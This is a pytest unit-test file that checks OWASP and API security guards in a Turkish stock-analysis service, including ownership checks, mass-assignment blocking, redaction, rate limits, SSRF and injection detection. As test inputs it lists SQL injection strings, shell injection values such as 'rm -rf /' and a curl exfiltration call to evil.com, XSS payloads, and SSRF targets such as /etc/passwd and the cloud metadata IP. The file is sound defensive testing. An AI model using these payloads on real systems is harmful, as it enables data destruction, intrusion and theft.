"""Unit tests for OWASP Top 10 and API Security Top 10 controls and guards."""

from __future__ import annotations

import pytest

from stock_analysis.security.owasp import (
    ApiInventoryGuard,
    ApiInventoryViolationError,
    ApiSecurityTop10Code,
    BolaAccessDeniedError,
    BolaOwnershipGuard,
    InjectionDetectedError,
    InjectionGuard,
    MassAssignmentError,
    ObjectPropertyGuard,
    OwaspControlRegistry,
    OwaspTop10Code,
    ResourceConsumptionGuard,
    ResourceLimitExceededError,
    SecurityControlStatus,
    SsrfProtectionGuard,
    SsrfViolationError,
    get_default_owasp_registry,
    reset_default_owasp_registry,
)


class TestOwaspControlRegistry:
    """Verifies that all OWASP Top 10 and API Security Top 10 controls are cataloged."""

    def test_registry_contains_all_top_10_controls(self) -> None:
        registry = OwaspControlRegistry()
        owasp_controls = registry.list_owasp_top_10()
        api_controls = registry.list_api_security_top_10()

        assert len(owasp_controls) == 10
        assert len(api_controls) == 10

        # Check all OWASP Top 10 enum codes
        for owasp_code in OwaspTop10Code:
            ctrl_owasp = registry.get_control(owasp_code.value)
            assert ctrl_owasp.code == owasp_code.value
            assert ctrl_owasp.status == SecurityControlStatus.ENFORCED
            assert ctrl_owasp.mitigation != ""
            assert ctrl_owasp.component_reference != ""

        # Check all API Security Top 10 enum codes
        for api_code in ApiSecurityTop10Code:
            ctrl_api = registry.get_control(api_code.value)
            assert ctrl_api.code == api_code.value
            assert ctrl_api.status == SecurityControlStatus.ENFORCED
            assert ctrl_api.mitigation != ""
            assert ctrl_api.component_reference != ""

    def test_evaluate_compliance_report(self) -> None:
        registry = OwaspControlRegistry()
        report = registry.evaluate_compliance()

        assert report.total_controls == 20
        assert report.enforced_count == 20
        assert report.coverage_ratio == 1.0
        assert len(report.controls) == 20

    def test_singleton_registry_lifecycle(self) -> None:
        reset_default_owasp_registry()
        reg1 = get_default_owasp_registry()
        reg2 = get_default_owasp_registry()
        assert reg1 is reg2

        reset_default_owasp_registry()
        reg3 = get_default_owasp_registry()
        assert reg3 is not reg1


class TestBolaOwnershipGuard:
    """Tests Broken Object Level Authorization (BOLA/IDOR) verification."""

    def test_owner_access_granted(self) -> None:
        # Same user access should pass silently
        BolaOwnershipGuard.verify_ownership(subject_id=42, owner_id=42, resource_type="watchlist")
        BolaOwnershipGuard.verify_ownership(
            subject_id="user_abc", owner_id="user_abc", resource_type="alert"
        )

    def test_cross_user_access_denied(self) -> None:
        with pytest.raises(BolaAccessDeniedError) as exc_info:
            BolaOwnershipGuard.verify_ownership(
                subject_id=10, owner_id=99, resource_type="watchlist"
            )
        assert "watchlist" in str(exc_info.value)
        assert "Erisim reddedildi" in str(exc_info.value)

    def test_admin_override_allowed(self) -> None:
        # Admin can access resource belonging to another user
        BolaOwnershipGuard.verify_ownership(
            subject_id=1, owner_id=99, is_admin=True, resource_type="audit_log"
        )


class TestObjectPropertyGuard:
    """Tests BOPLA, Mass Assignment prevention and Sensitive Field Redaction."""

    def test_inbound_payload_valid_fields_allowed(self) -> None:
        payload = {"name": "Teknoloji Fonu", "description": "BIST 100 hisseleri"}
        allowed = {"name", "description"}
        cleaned = ObjectPropertyGuard.sanitize_inbound_payload(payload, allowed_fields=allowed)
        assert cleaned == payload

    def test_inbound_payload_forbidden_privilege_field_rejected(self) -> None:
        malicious_payload = {
            "name": "Yeni Liste",
            "is_admin": True,
            "role": "super_admin",
        }
        with pytest.raises(MassAssignmentError) as exc_info:
            ObjectPropertyGuard.sanitize_inbound_payload(malicious_payload, allowed_fields={"name"})
        assert "is_admin" in str(exc_info.value) or "role" in str(exc_info.value)

    def test_inbound_payload_strips_unallowed_fields_non_strict(self) -> None:
        payload = {"name": "Analiz", "extra_field": "ignore_me"}
        cleaned = ObjectPropertyGuard.sanitize_inbound_payload(
            payload, allowed_fields={"name"}, strict_reject=False
        )
        assert cleaned == {"name": "Analiz"}

    def test_outbound_payload_redacts_sensitive_keys(self) -> None:
        response_dict = {
            "user_id": 12,
            "email": "user@example.com",
            "password_hash": "$argon2id$v=19$m=65536,t=3,p=4$secret",
            "token": "bearer_secret_123",
            "profile": {
                "display_name": "Trader",
                "secret_key": "raw_hmac_secret",
            },
            "sessions": [
                {"session_id": "sess_1", "session_secret": "xyz"},
                {"session_id": "sess_2", "active": True},
            ],
        }

        sanitized = ObjectPropertyGuard.sanitize_outbound_payload(response_dict)
        assert "password_hash" not in sanitized
        assert "token" not in sanitized
        assert sanitized["profile"] == {"display_name": "Trader"}
        assert sanitized["sessions"] == [
            {"session_id": "sess_1"},
            {"session_id": "sess_2", "active": True},
        ]
        assert sanitized["user_id"] == 12
        assert sanitized["email"] == "user@example.com"


class TestResourceConsumptionGuard:
    """Tests API4: Unrestricted Resource Consumption validation."""

    def test_pagination_limits(self) -> None:
        limit, offset = ResourceConsumptionGuard.validate_pagination(limit=25, offset=50)
        assert limit == 25
        assert offset == 50

        # Default limit when 0 or negative
        limit_def, _ = ResourceConsumptionGuard.validate_pagination(limit=0, offset=0)
        assert limit_def == 20

        # Limit exceeding ceiling raises error
        with pytest.raises(ResourceLimitExceededError) as exc_info:
            ResourceConsumptionGuard.validate_pagination(limit=500, offset=0, max_limit=100)
        assert "azami siniri (100) asamaz" in str(exc_info.value)

        # Negative offset raises error
        with pytest.raises(ResourceLimitExceededError) as exc_info:
            ResourceConsumptionGuard.validate_pagination(limit=10, offset=-1)
        assert "negatif olamaz" in str(exc_info.value)

    def test_payload_size_enforcement(self) -> None:
        # 500 KB within 1 MB cap
        ResourceConsumptionGuard.validate_payload_size(500_000)

        # 2 MB exceeds 1 MB cap
        with pytest.raises(ResourceLimitExceededError) as exc_info:
            ResourceConsumptionGuard.validate_payload_size(2_000_000, max_bytes=1_048_576)
        assert "azami izin verilen siniri" in str(exc_info.value)

    def test_batch_size_enforcement(self) -> None:
        # 30 items within default 50 cap
        ResourceConsumptionGuard.validate_batch_size(30)

        # 100 items exceeds 50 cap
        with pytest.raises(ResourceLimitExceededError) as exc_info:
            ResourceConsumptionGuard.validate_batch_size(100, max_items=50)
        assert "Toplu islem adedi" in str(exc_info.value)


class TestInjectionGuard:
    """Tests A03: SQLi, Shell, and XSS injection heuristics."""

    def test_legitimate_inputs_pass(self) -> None:
        legit_inputs = [
            "THYAO",
            "Kapanis fiyati 280.50 TL",
            "2026-10-24",
            "Trend takip kurali (SMA20 > SMA50)",
            "user@borsa-analiz.com",
        ]
        for val in legit_inputs:
            InjectionGuard.scan_input(val)

    @pytest.mark.parametrize(
        "sqli_payload",
        [
            "' OR '1'='1",
            "1; DROP TABLE users; --",
            "admin' OR 1=1 --",
            "' UNION SELECT null, username, password FROM users --",
            "x'; EXEC xp_cmdshell('dir'); --",
        ],
    )
    def test_sql_injection_detected(self, sqli_payload: str) -> None:
        with pytest.raises(InjectionDetectedError) as exc_info:
            InjectionGuard.assert_safe_sql_param(sqli_payload)
        assert "SQL enjeksiyon deseni" in str(exc_info.value)

    @pytest.mark.parametrize(
        "shell_payload",
        [
            "THYAO; rm -rf /",
            "symbol && curl evil.com/exfil",
            "GARAN | bash",
            "$(cat /etc/passwd)",
            "`whoami`",
        ],
    )
    def test_shell_injection_detected(self, shell_payload: str) -> None:
        with pytest.raises(InjectionDetectedError) as exc_info:
            InjectionGuard.assert_safe_shell_param(shell_payload)
        assert "komut calistirma deseni" in str(exc_info.value)

    @pytest.mark.parametrize(
        "xss_payload",
        [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:stealCookies()",
            "<iframe src='http://evil.com'></iframe>",
            "<a href='#' onclick='malicious()'>link</a>",
        ],
    )
    def test_xss_detected(self, xss_payload: str) -> None:
        with pytest.raises(InjectionDetectedError) as exc_info:
            InjectionGuard.assert_safe_xss_content(xss_payload)
        assert "XSS" in str(exc_info.value)


class TestSsrfProtectionGuard:
    """Tests SSRF protection across external requests and webhooks."""

    def test_valid_public_urls_allowed(self) -> None:
        valid_urls = [
            "https://api.borsa.example.com/v1/quotes",
            "http://kap.example.com/announcements",
            "https://data.finans.org/feed.json",
        ]
        for url in valid_urls:
            assert SsrfProtectionGuard.validate_target_url(url) == url

    @pytest.mark.parametrize(
        "forbidden_scheme",
        [
            "file:///etc/passwd",
            "gopher://127.0.0.1:70",
            "dict://127.0.0.1:11211",
            "ftp://ftp.example.com/data",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ],
    )
    def test_forbidden_schemes_blocked(self, forbidden_scheme: str) -> None:
        with pytest.raises(SsrfViolationError) as exc_info:
            SsrfProtectionGuard.validate_target_url(forbidden_scheme)
        assert "Yasakli URL semasi" in str(exc_info.value)

    @pytest.mark.parametrize(
        "private_target",
        [
            "http://127.0.0.1:8080/admin",
            "http://localhost/metrics",
            "http://10.0.0.15/internal",
            "http://192.168.1.1/setup",
            "http://172.16.50.4/api",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://[::1]:9000/",
        ],
    )
    def test_private_and_metadata_ips_blocked(self, private_target: str) -> None:
        with pytest.raises(SsrfViolationError) as exc_info:
            SsrfProtectionGuard.validate_target_url(private_target)
        assert "SSRF engellendi" in str(exc_info.value)

    def test_domain_allowlist_enforcement(self) -> None:
        allowlist = {"api.kap.gov.tr", "borsa.gov.tr"}

        # Allowed subdomains or exact matches
        assert (
            SsrfProtectionGuard.validate_target_url(
                "https://api.kap.gov.tr/feed", allowed_domains=allowlist
            )
            == "https://api.kap.gov.tr/feed"
        )
        assert (
            SsrfProtectionGuard.validate_target_url(
                "https://veri.borsa.gov.tr/market", allowed_domains=allowlist
            )
            == "https://veri.borsa.gov.tr/market"
        )

        # Unapproved external domain
        with pytest.raises(SsrfViolationError) as exc_info:
            SsrfProtectionGuard.validate_target_url(
                "https://untrusted-api.evil.com/webhook", allowed_domains=allowlist
            )
        assert "allowlist" in str(exc_info.value)


class TestApiInventoryGuard:
    """Tests API9: Improper Inventory Management controls."""

    def test_approved_routes_pass(self) -> None:
        approved = [
            "/api/v1/stocks/GARAN",
            "/api/v1/auth/login",
            "/health",
            "/metrics",
            "/docs",
            "/openapi.json",
            "/alerts/unsubscribe",
            "/alerts/consent",
        ]
        for route in approved:
            ApiInventoryGuard.validate_route(route)

    @pytest.mark.parametrize(
        "shadow_route",
        [
            "/v0/legacy-quote",
            "/beta/experimental-feature",
            "/debug/profiler",
            "/internal/admin-dump",
            "/test/reset-db",
            "/admin-unprotected/users",
            "/unknown/unversioned-route",
        ],
    )
    def test_shadow_and_unversioned_routes_rejected(self, shadow_route: str) -> None:
        with pytest.raises(ApiInventoryViolationError):
            ApiInventoryGuard.validate_route(shadow_route)
